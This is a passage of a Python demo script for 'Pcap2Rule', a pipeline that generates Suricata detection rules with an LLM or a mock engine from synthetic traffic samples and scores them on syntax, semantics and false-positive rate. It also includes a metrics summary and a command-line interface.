    variant_coverage: float = 0.0         # VC: % variants detected
    false_positive_rate: float = 0.0      # FPR: avg false positive rate
    f1_score: float = 0.0                 # F1: harmonic mean
    avg_iterations: float = 0.0           # avg refinement iterations
    avg_time_seconds: float = 0.0         # avg processing time per sample

    def to_dict(self) -> Dict[str, float]:
        return {
            'SV (%)': round(self.syntactic_validity * 100, 1),
            'DC (%)': round(self.detection_coverage * 100, 1),
            'VC (%)': round(self.variant_coverage * 100, 1),
            'FPR (%)': round(self.false_positive_rate * 100, 1),
            'F1 (%)': round(self.f1_score * 100, 1),
            'Avg Iterations': round(self.avg_iterations, 1),
            'Avg Time (s)': round(self.avg_time_seconds, 2),
        }


def compute_demo_metrics(results: List[Dict]) -> DemoMetrics:
    """Compute experimental metrics from demo results."""
    n = len(results)
    if n == 0:
        return DemoMetrics()

    sv = sum(1 for r in results if r['syntax_valid']) / n
    dc = sum(1 for r in results if r['semantic_ok']) / n  # proxy: semantic pass
    vc = sum(1 for r in results if r['generalized_valid']) / n  # proxy: generalized passes syntax
    fpr = sum(r['fpr'] for r in results) / n
    f1 = 2 * dc * (1 - fpr) / (dc + (1 - fpr)) if (dc + (1 - fpr)) > 0 else 0.0
    avg_iter = sum(r['iterations'] for r in results) / n
    avg_time = sum(r['time_seconds'] for r in results) / n

    return DemoMetrics(
        syntactic_validity=sv,
        detection_coverage=dc,
        variant_coverage=vc,
        false_positive_rate=fpr,
        f1_score=f1,
        avg_iterations=avg_iter,
        avg_time_seconds=avg_time,
    )


# ══════════════════════════════════════════════════════════════════
# Main Demo Pipeline
# ══════════════════════════════════════════════════════════════════

def run_demo(
    attack_types: Optional[List[str]] = None,
    n_per_type: int = 2,
    use_llm: bool = False,
    verbose: bool = False,
    seed: int = 42,
) -> Dict[str, Any]:
    """Run the complete Pcap2Rule demo pipeline.

    Args:
        attack_types: List of attack types to process (None = all).
        n_per_type: Number of samples per attack type.
        use_llm: If True, attempt to use a real LLM (requires GPU/model).
        verbose: Print detailed intermediate outputs.
        seed: Random seed for reproducibility.

    Returns:
        Dict with 'results', 'metrics', and 'summary'.
    """
    rng = np.random.RandomState(seed)

    if attack_types is None:
        attack_types = ATTACK_TYPES

    print("=" * 70)
    print("  Pcap2Rule Demo Pipeline")
    print("  Multi-Modal LLM Agent for Automated Suricata Rule Generation")
    print("=" * 70)
    print(f"\n  Attack types: {len(attack_types)}")
    print(f"  Samples per type: {n_per_type}")
    print(f"  Total samples: {len(attack_types) * n_per_type}")
    print(f"  LLM mode: {'Real (GPU required)' if use_llm else 'Mock (no GPU)'}")
    print(f"  Random seed: {seed}")
    print()

    # ── Step 1: Generate Synthetic Data ──
    print("─" * 70)
    print("Step 1: Generating synthetic traffic data...")
    samples = generate_demo_samples(attack_types=attack_types, n_per_type=n_per_type, seed=seed)
    print(f"  Generated {len(samples)} synthetic traffic samples")
    if verbose:
        for s in samples[:3]:
            print(f"    {s.sample_id}: {s.attack_type}, "
                  f"flow shape={s.flow_features.shape}, "
                  f"payload_len={len(s.payload_text)}")

    # ── Step 2: Initialize Components ──
    print("\n─" * 70)
    print("Step 2: Initializing pipeline components...")

    # RAG retriever
    rag = MockRAGRetriever(DEMO_KNOWLEDGE_BASE)
    print(f"  RAG Knowledge Base: {len(DEMO_KNOWLEDGE_BASE)} exemplar rules loaded")

    # LLM engine
    if use_llm:
        print("  LLM: Attempting to load Qwen2-7B...")
        try:
            from pcap2rule.llm_agent.model import load_model_hf
            model, tokenizer = load_model_hf(
                "Qwen/Qwen2-7B-Instruct",
                load_in_4bit=True,
            )
            from pcap2rule.llm_agent.inference import InferenceEngine
            llm = InferenceEngine(backend="hf", model=model, tokenizer=tokenizer)
            use_mock_llm = False
            print("  LLM: Qwen2-7B loaded successfully (4-bit)")
        except Exception as e:
            print(f"  LLM: Failed to load model ({e})")
            print("  LLM: Falling back to mock engine")
            llm = MockLLMEngine()
            use_mock_llm = True
    else:
        llm = MockLLMEngine()
        use_mock_llm = True
        print("  LLM: Using mock engine (--no-llm mode)")

    # CTI Builder
    try:
        from pcap2rule.pcap_processor.cti_builder import CTIBuilder
        cti_builder = CTIBuilder(use_sandbox_data=False)
        print("  CTI Builder: Initialized (3D: Host + Network + Temporal)")
    except ImportError as e:
        print(f"  CTI Builder: Failed to import ({e}), using simplified mode")
        cti_builder = None

    # ── Step 3: Process Each Sample ──
    print("\n─" * 70)
    print("Step 3: Running pipeline on each sample...")
    print()

    results = []
    for i, sample in enumerate(samples):
        t_start = time.time()
        at = sample.attack_type

        if verbose:
            print(f"[{i+1}/{len(samples)}] {sample.sample_id} ({at})")
        else:
            print(f"  [{i+1:2d}/{len(samples)}] {sample.sample_id:<30s} ", end="", flush=True)

        # 3a: Build Structured CTI
        if cti_builder:
            cti = cti_builder.build(
                flow_features=sample.flow_features,
                payload_text=sample.payload_text,
                attack_type_hint=at,
            )
        else:
            cti = build_cti_for_demo(at, sample.flow_features, sample.payload_text)
        sample.cti = cti

        # 3b: RAG Retrieval
        exemplars = rag.retrieve(at, k=3)

        # 3c: Build Prompt
        prompt = build_demo_prompt(
            sample.flow_features, sample.payload_text, cti, exemplars, at
        )

        if verbose:
            print(f"    Prompt length: {len(prompt)} chars")
            print(f"    CTI dimensions: Host={cti.host_entity.process_name if hasattr(cti, 'host_entity') else 'N/A'}, "
                  f"Net={len(cti.network_communication.destination_ips) if hasattr(cti, 'network_communication') else 'N/A'} IPs, "
                  f"Temp={cti.temporal_behavior.session_duration_seconds if hasattr(cti, 'temporal_behavior') else 'N/A'}s")
            print(f"    Exemplars retrieved: {len(exemplars)}")

        # 3d: Generate Rules (5-step CoT)
        if use_mock_llm:
            specific_rule, generalized_rule = llm.generate(at)
            iterations = 1
        else:
            generated = llm.generate(prompt)
            rules = llm.extract_rules(generated)
            specific_rule = rules.get('specific', '')
            generalized_rule = rules.get('generalized', '')
            iterations = 1

        # 3e: Validation Pipeline
        # Stage 1: Syntax
        syntax_ok, syn_fb = validate_syntax(specific_rule)
        # Stage 2: Semantic
        sem_score, sem_ok, sem_fb = validate_semantic(specific_rule, at)
        # Stage 3: Performance
        fpr, fpr_ok, perf_fb = validate_performance(specific_rule, at)

        # 3f: Generalization validation
        gen_ok, _ = validate_syntax(generalized_rule)

        # Refinement loop (mock: 1 iteration)
        if not (syntax_ok and sem_ok and fpr_ok):
            # In real pipeline, would re-generate with feedback
            # For demo, we accept the first attempt
            pass

        t_elapsed = time.time() - t_start

        # Store result
        result = {
            'sample_id': sample.sample_id,
            'attack_type': at,
            'specific_rule': specific_rule,
            'generalized_rule': generalized_rule,
            'syntax_valid': syntax_ok,
            'semantic_score': sem_score,
            'semantic_ok': sem_ok,
            'fpr': fpr,
            'fpr_ok': fpr_ok,
            'generalized_valid': gen_ok,
            'iterations': iterations,
            'time_seconds': t_elapsed,
            'prompt_length': len(prompt),
        }
        results.append(result)

        # Print status
        status = "✓" if (syntax_ok and sem_ok and fpr_ok) else "⚠"
        if not verbose:
            print(f"{status} SV={'✓' if syntax_ok else '✗'} "
                  f"Sem={sem_score:.2f} FPR={fpr:.3f} "
                  f"({t_elapsed:.2f}s)")

        if verbose:
            print(f"    Specific rule:  {specific_rule[:120]}...")
            print(f"    Generalized:    {generalized_rule[:120]}...")
            print(f"    Syntax: {'PASS' if syntax_ok else 'FAIL'} — {syn_fb}")
            print(f"    Semantic: {sem_score:.2f} ({'PASS' if sem_ok else 'FAIL'})")
            print(f"    FPR: {fpr:.3f} ({'PASS' if fpr_ok else 'FAIL'})")
            print(f"    Iterations: {iterations}, Time: {t_elapsed:.2f}s")
            print()

    # ── Step 4: Compute Metrics ──
    print("\n─" * 70)
    print("Step 4: Computing evaluation metrics...")
    metrics = compute_demo_metrics(results)

    # ── Step 5: Summary ──
    print("\n" + "=" * 70)
    print("  DEMO RESULTS SUMMARY")
    print("=" * 70)
    print(f"  {'Metric':<35s} {'Value':>15s}")
    print(f"  {'─'*35} {'─'*15}")
    for name, value in metrics.to_dict().items():
        print(f"  {name:<35s} {value:>15}")
    print(f"  {'─'*35} {'─'*15}")
    print(f"  {'Total samples processed':<35s} {len(results):>15d}")
    print(f"  {'Total time':<35s} {sum(r['time_seconds'] for r in results):>14.2f}s")
    print()

    # Per-attack-type breakdown
    print("  Per-Attack-Type Breakdown:")
    print(f"  {'Attack Type':<20s} {'SV':>6s} {'Sem':>6s} {'FPR':>6s} {'Gen':>6s}")
    print(f"  {'─'*20} {'─'*6} {'─'*6} {'─'*6} {'─'*6}")
    from collections import defaultdict
    by_type = defaultdict(list)
    for r in results:
        by_type[r['attack_type']].append(r)
    for at in sorted(by_type.keys()):
        rs = by_type[at]
        sv = sum(1 for r in rs if r['syntax_valid']) / len(rs)
        sem = sum(r['semantic_score'] for r in rs) / len(rs)
        fpr = sum(r['fpr'] for r in rs) / len(rs)
        gen = sum(1 for r in rs if r['generalized_valid']) / len(rs)
        print(f"  {at:<20s} {sv:>5.0%} {sem:>5.2f} {fpr:>5.3f} {gen:>5.0%}")

    print("\n" + "=" * 70)
    print("  Demo completed successfully!")
    print("=" * 70)

    return {
        'results': results,
        'metrics': metrics,
        'samples': samples,
    }


# ══════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='Pcap2Rule Demo — Runnable pipeline demonstration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python demo.py                           # Full demo, all attack types
  python demo.py --attack "SQL Injection"  # Single attack type
  python demo.py --no-llm --verbose        # Mock mode with detailed output
  python demo.py --samples 5               # 5 samples per attack type
  python demo.py --output results.json     # Save results to JSON
        """,
    )
    parser.add_argument('--attack', type=str, default=None,
                       help='Single attack type to test (default: all)')
    parser.add_argument('--samples', type=int, default=2,
                       help='Samples per attack type (default: 2)')
    parser.add_argument('--no-llm', action='store_true', default=True,
                       help='Use mock LLM (default: True)')
    parser.add_argument('--llm', dest='use_llm', action='store_true',
                       help='Try to use real Qwen2-7B LLM (requires GPU)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Print detailed intermediate outputs')
    parser.add_argument('--output', '-o', type=str, default=None,
                       help='Save results to JSON file')
    parser.add_argument('--seed', type=int, default=42,
                       help='Random seed (default: 42)')

    args = parser.parse_args()

    attack_types = [args.attack] if args.attack else None

    output = run_demo(
        attack_types=attack_types,
        n_per_type=args.samples,
        use_llm=args.use_llm,
        verbose=args.verbose,
        seed=args.seed,
    )

    if args.output:
        # Convert to serializable format
        serializable = {
            'metrics': output['metrics'].to_dict(),
            'results': [
                {k: v for k, v in r.items() if k not in ('specific_rule', 'generalized_rule')}
                | {'specific_rule': r['specific_rule'], 'generalized_rule': r['generalized_rule']}
                for r in output['results']
            ],
        }
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(serializable, f, indent=2, ensure_ascii=False)
        print(f"\nResults saved to {args.output}")


if __name__ == '__main__':
    main()
